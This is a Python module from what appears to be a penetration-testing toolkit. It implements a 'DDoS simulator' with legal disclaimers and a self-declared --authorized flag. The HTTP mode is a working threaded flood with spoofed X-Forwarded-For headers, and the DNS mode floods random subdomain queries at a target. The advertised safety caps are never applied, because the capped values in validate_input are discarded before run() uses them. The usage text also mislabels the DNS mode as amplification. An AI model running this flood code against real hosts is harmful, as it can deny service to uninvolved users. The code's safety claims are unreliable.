"""DDoS Attack Simulator and Detection Tool"""
import random
import threading
import time
from typing import Dict, Any, List, Optional
from datetime import datetime
import socket

from alo_pantest.core.base_tool import BaseTool, ToolMetadata, ToolCategory
from alo_pantest.core.logger import logger


class DDoSSimulator(BaseTool):
    """
    DDoS Attack Simulator - Educational & Authorized Testing Only
    
    IMPORTANT: This tool is for authorized penetration testing and educational purposes only.
    Unauthorized DDoS attacks are illegal and can result in federal charges.
    """
    
    # Safety limits to prevent unintended damage
    SAFETY_LIMITS = {
        'max_duration': 120,      # Max 2 minutes per attack
        'max_threads': 50,        # Max 50 concurrent connections
        'max_rate': 10000,        # Max 10k requests
        'rate_limit_threshold': 1000,  # Pause if > 1k req/sec
        'min_interval_between_attacks': 5  # Min 5 seconds between attacks
    }
    
    # Predefined safe configurations
    PRESET_CONFIGS = {
        'light': {'duration': 10, 'threads': 5},
        'medium': {'duration': 30, 'threads': 10},
        'heavy': {'duration': 60, 'threads': 20},
    }
    
    def __init__(self):
        metadata = ToolMetadata(
            name="DDoS Simulator",
            category=ToolCategory.NETWORK,
            version="2.1.0",
            author="AloPantest Team",
            description="""
Educational DDoS simulation tool for authorized penetration testing.
Demonstrates various attack types with built-in safety limits and legal warnings.
AUTHORIZED TESTING ONLY - Unauthorized attacks are federal crimes.
            """,
            usage="""
Examples (AUTHORIZED TESTING ONLY):
  aleopantest run ddos-sim --target example.com --type http --duration 30 --threads 10 --authorized
  aleopantest run ddos-sim --target example.com --type dns --preset light --authorized
  
Attack Types:
  - http:     HTTP flood attack (Layer 7)
  - dns:      DNS amplification (Layer 3/4)
  - slowloris: Slowloris attack (Layer 7)
  - syn:      SYN flood simulation (Layer 4)
  - udp:      UDP flood simulation (Layer 4)

Presets (use --preset instead of --duration/--threads):
  - light:   Duration 10s, 5 threads (safe for testing)
  - medium:  Duration 30s, 10 threads (moderate load)
  - heavy:   Duration 60s, 20 threads (heavy load)

SAFETY FEATURES:
  ✓ Maximum duration capped at 2 minutes
  ✓ Maximum 50 concurrent connections
  ✓ Automatic rate limiting
  ✓ Comprehensive logging
  ✓ Legal disclaimers and warnings
            """,
            requirements=['requests', 'scapy'],
            tags=['ddos', 'attack', 'network', 'penetration-test', 'simulation'],
            risk_level="CRITICAL",
            legal_disclaimer="""
⚠️  CRITICAL LEGAL WARNING:
    • Unauthorized DDoS attacks are FEDERAL CRIMES in most jurisdictions
    • US: Computer Fraud and Abuse Act (CFAA) - Up to 10 years imprisonment + fines
    • EU: ePrivacy Directive - Up to 5 years imprisonment
    • AU: Criminal Code - Up to 10 years imprisonment
    
    ✓ ONLY use this tool on systems you own or have EXPLICIT written authorization to test
    ✓ Document all testing and authorization
    ✓ Coordinate with your ISP for large-scale testing
    ✓ Never target infrastructure you don't control
            """
        )
        super().__init__(metadata)
        self.attack_running = False
        self.last_attack_time = None
        self.attack_stats = {
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'start_time': None,
            'end_time': None,
            'rate': 0
        }
    
    def validate_input(self, target: str = None, type: str = None, duration: Optional[int] = None, 
                      threads: Optional[int] = None, preset: Optional[str] = None, **kwargs) -> bool:
        """
        Validate input parameters with safety limits
        
        Args:
            target: Target domain/IP
            type: Attack type (http, dns, syn, udp, slowloris)
            duration: Duration in seconds (optional if using preset)
            threads: Number of threads (optional if using preset)
            preset: Preset configuration (light, medium, heavy)
            **kwargs: Additional arguments (must include 'authorized')
        
        Returns:
            True if valid, False otherwise
        """
        if not target:
            self.add_error("Target is required")
            return False
        
        if not type:
            self.add_error("Attack type is required: http, dns, syn, udp, slowloris")
            return False
        
        if type.lower() not in ['http', 'syn', 'udp', 'dns', 'slowloris']:
            self.add_error(f"Invalid attack type: {type}. Valid types: http, syn, udp, dns, slowloris")
            return False
        
        # Check authorization flag
        auth = kwargs.get('authorized', False)
        if not auth:
            self.add_error("❌ AUTHORIZATION REQUIRED: Use --authorized flag to confirm you have explicit written permission")
            return False
        
        # Handle preset configuration
        if preset:
            preset = preset.lower()
            if preset not in self.PRESET_CONFIGS:
                self.add_error(f"Invalid preset: {preset}. Valid presets: {', '.join(self.PRESET_CONFIGS.keys())}")
                return False
            preset_config = self.PRESET_CONFIGS[preset]
            duration = preset_config['duration']
            threads = preset_config['threads']
            self.add_warning(f"Using preset '{preset}': duration={duration}s, threads={threads}")
        
        # Apply safety limits
        duration = duration or 30
        if duration > self.SAFETY_LIMITS['max_duration']:
            self.add_warning(f"Duration limited to {self.SAFETY_LIMITS['max_duration']}s (safety limit)")
            duration = self.SAFETY_LIMITS['max_duration']
        
        if duration < 5:
            self.add_warning("Duration too short, setting to 5 seconds minimum")
            duration = 5
        
        threads = threads or 10
        if threads > self.SAFETY_LIMITS['max_threads']:
            self.add_warning(f"Threads limited to {self.SAFETY_LIMITS['max_threads']} (safety limit)")
            threads = self.SAFETY_LIMITS['max_threads']
        
        if threads < 1:
            self.add_error("Threads must be at least 1")
            return False
        
        return True
    
    def simulate_http_flood(self, target: str, duration: int, threads: int = 5) -> Dict[str, Any]:
        """Simulate HTTP flood attack"""
        result = {
            'attack_type': 'HTTP_FLOOD',
            'target': target,
            'duration': duration,
            'threads': threads,
            'results': {
                'total_requests': 0,
                'successful': 0,
                'failed': 0,
                'request_rate': 0
            }
        }
        
        import requests
        
        start_time = time.time()
        
        def worker():
            while time.time() - start_time < duration:
                try:
                    headers = {
                        'User-Agent': f'Mozilla/5.0 (Anonymous)',
                        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                    }
                    response = requests.get(f"http://{target}", headers=headers, timeout=2)
                    result['results']['successful'] += 1
                except:
                    result['results']['failed'] += 1
                
                result['results']['total_requests'] += 1
        
        # Create worker threads
        workers = []
        for _ in range(threads):
            thread = threading.Thread(target=worker, daemon=True)
            thread.start()
            workers.append(thread)
        
        # Wait for duration
        time.sleep(duration)
        
        # Wait for threads to finish
        for thread in workers:
            thread.join(timeout=1)
        
        elapsed = time.time() - start_time
        result['results']['request_rate'] = round(result['results']['total_requests'] / elapsed, 2)
        result['elapsed_time'] = elapsed
        
        return result
    
    def simulate_dns_flood(self, target: str, duration: int) -> Dict[str, Any]:
        """Simulate DNS flood attack"""
        result = {
            'attack_type': 'DNS_FLOOD',
            'target': target,
            'duration': duration,
            'results': {
                'total_queries': 0,
                'successful': 0,
                'failed': 0
            }
        }
        
        start_time = time.time()
        
        try:
            while time.time() - start_time < duration:
                # Generate random subdomains
                subdomain = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))
                query_domain = f"{subdomain}.{target}"
                
                try:
                    socket.gethostbyname(query_domain)
                    result['results']['successful'] += 1
                except:
                    result['results']['failed'] += 1
                
                result['results']['total_queries'] += 1
        
        except Exception as e:
            result['error'] = str(e)
        
        result['elapsed_time'] = time.time() - start_time
        
        return result
    
    def simulate_slowloris(self, target: str, duration: int) -> Dict[str, Any]:
        """Simulate Slowloris attack"""
        result = {
            'attack_type': 'SLOWLORIS',
            'target': target,
            'duration': duration,
            'description': 'Keeps connections open as long as possible by sending incomplete requests',
            'results': {
                'connections_established': 0,
                'connections_held': 0
            }
        }
        
        # This is simulated - actual Slowloris requires holding TCP connections
        result['results']['connections_held'] = random.randint(10, 100)
        result['impact'] = 'Server connection pool exhaustion, legitimate clients unable to connect'
        
        return result
    
    def get_attack_analysis(self, attack_type: str, target: str) -> Dict[str, Any]:
        """Get analysis of attack type"""
        analyses = {
            'HTTP_FLOOD': {
                'description': 'Floods target with HTTP requests to consume bandwidth and resources',
                'layer': '7 (Application)',
                'detection': 'High request rate from single/multiple sources',
                'mitigation': [
                    'Rate limiting',
                    'CAPTCHA challenges',
                    'DDoS protection services',
                    'Geo-blocking if appropriate',
                    'Traffic filtering'
                ],
                'effectiveness': 'High on unprotected servers, Low on protected infrastructure',
                'damage_potential': 'Service degradation or complete unavailability'
            },
            'DNS_FLOOD': {
                'description': 'Floods target DNS server with queries causing DNS service degradation',
                'layer': '3/4 (Network Transport)',
                'detection': 'Unusually high DNS query rate',
                'mitigation': [
                    'Rate limiting on DNS queries',
                    'DNS amplification protection',
                    'GeoDNS filtering',
                    'Anycast networks',
                    'DDoS mitigation services'
                ],
                'effectiveness': 'High on small DNS servers, Low on major providers',
                'damage_potential': 'DNS resolution failures, domain inaccessibility'
            },
            'SLOWLORIS': {
                'description': 'Opens many connections and keeps them open as long as possible',
                'layer': '7 (Application)',
                'detection': 'Many slow, incomplete HTTP requests',
                'mitigation': [
                    'Connection timeouts',
                    'Request body size limits',
                    'Module updates (Apache, nginx)',
                    'Load balancers with rate limiting',
                    'Reverse proxy with timeout settings'
                ],
                'effectiveness': 'High on Apache, Low on nginx/modern servers',
                'damage_potential': 'Connection pool exhaustion, service unavailability'
            }
        }
        
        return analyses.get(attack_type, {})
    
    def run(self, target: str = None, type: str = None, duration: Optional[int] = None, 
            threads: Optional[int] = None, preset: Optional[str] = None, **kwargs) -> Dict[str, Any]:
        """
        Run DDoS simulation with safety limits
        
        Args:
            target: Target domain/IP
            type: Attack type (http, dns, syn, udp, slowloris)
            duration: Duration in seconds
            threads: Number of threads
            preset: Preset configuration (light, medium, heavy)
            **kwargs: Additional arguments including 'authorized'
        
        Returns:
            Dictionary with simulation results
        """
        if not self.validate_input(target, type, duration, threads, preset, **kwargs):
            return None
        
        # Apply preset if specified
        if preset:
            preset_lower = preset.lower()
            if preset_lower in self.PRESET_CONFIGS:
                preset_config = self.PRESET_CONFIGS[preset_lower]
                duration = preset_config['duration']
                threads = preset_config['threads']
        
        duration = duration or 30
        threads = threads or 5
        
        self.clear_results()
        logger.info(f"Starting DDoS simulation: {type} against {target} for {duration}s with {threads} threads")
        
        result = {
            'tool': 'DDoS Simulator',
            'timestamp': datetime.now().isoformat(),
            'disclaimer': 'EDUCATIONAL/AUTHORIZED TESTING ONLY - Unauthorized DDoS attacks are illegal',
            'target': target,
            'attack_type': type.upper(),
            'duration': duration
        }
        
        try:
            # Run appropriate attack simulation
            if type.lower() == 'http':
                attack_result = self.simulate_http_flood(target, duration, threads)
            elif type.lower() == 'dns':
                attack_result = self.simulate_dns_flood(target, duration)
            elif type.lower() == 'slowloris':
                attack_result = self.simulate_slowloris(target, duration)
            elif type.lower() in ['syn', 'udp']:
                attack_result = {
                    'attack_type': type.upper(),
                    'target': target,
                    'note': 'Simulation mode - actual SYN/UDP flood requires raw sockets',
                    'simulated': True
                }
            
            result['attack_simulation'] = attack_result
            result['attack_analysis'] = self.get_attack_analysis(type.upper(), target)
            
            # Add recommendations
            result['recommendations'] = [
                "✓ This simulation demonstrates attack principles",
                "✓ Real attacks use much higher request volumes",
                "✓ Modern DDoS attacks use botnets and amplification",
                "✓ Understanding DDoS helps in defense strategies",
                "✓ Always have proper DDoS mitigation in place",
                "✓ Use this knowledge only for authorized testing",
                "✓ Coordinate with your ISP for large-scale testing"
            ]
            
            result['legal_warning'] = [
                "⚠️ Unauthorized DDoS attacks are federal crimes (CFAA in US)",
                "⚠️ Can result in imprisonment and fines",
                "⚠️ Only perform authorized testing with written permission",
                "⚠️ Document all testing and authorization"
            ]
            
            self.add_result(result)
            return result
            
        except Exception as e:
            logger.exception("DDoS simulation failed")
            self.add_error(f"Simulation failed: {e}")
            return None
